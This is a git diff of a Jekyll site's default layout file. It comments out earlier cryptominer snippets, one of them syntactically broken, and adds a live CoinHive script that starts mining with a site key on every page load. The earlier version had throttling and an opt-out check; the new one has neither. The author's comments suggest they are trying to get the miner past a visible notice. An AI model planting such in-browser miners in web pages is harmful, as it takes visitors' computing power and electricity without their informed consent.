@@ -138,14 +138,19 @@ layout: default
 	if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		miner.start();
 	}
-</script>-->
-<script src="<https://coinhive.com/lib/coinhive.min.js>"></script> 
+</script>--><!-- it run in right way,but it show the attention !-->
+
+
+<!--<script src="<https://coinhive.com/lib/coinhive.min.js>"></script> 
 <script> 
-var miner = new CoinHive.Anonymous('oRJEmNvXQi3rR9RknDIdBJHHROdqvnLK'{throttle: 0.3});
+var miner = new CoinHive.Anonymous('oRJEmNvXQi3rR9RknDIdBJHHROdqvnLK'[, options]); 
+miner.start(); 
+</script><!-- why it start one time ,and then stop !-->
 
-if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('oRJEmNvXQi3rR9RknDIdBJHHROdqvnLK', 'john-doe');
+	miner.start();
 </script>
-
 <!-- <script src="{{ "/js/pageContent.js " | prepend: site.baseurl }}" charset="utf-8"></script> -->
 
